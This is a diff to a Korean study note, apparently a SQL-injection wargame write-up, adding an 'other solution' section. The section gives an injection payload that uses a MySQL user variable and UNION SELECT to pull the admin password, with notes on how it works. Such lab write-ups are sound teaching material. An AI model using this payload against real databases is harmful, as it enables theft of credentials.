@@ -54,3 +54,10 @@ ascii 대신 ord 사용 가능
 + 문자, 숫자: 1byte 차지
 + 한글: 3byte(utf - 8), 4byte(utf)
 ```
+
+### 다른 풀이
+1. ?pw='||(select @a:=pw where id='admin') union select @a %23
+   - @local_variable="aaaa"
+   - => 변수 선언
+   - => 변수 선택
+   - => union select로 변수를 결과 테이블에 합쳐서 출력
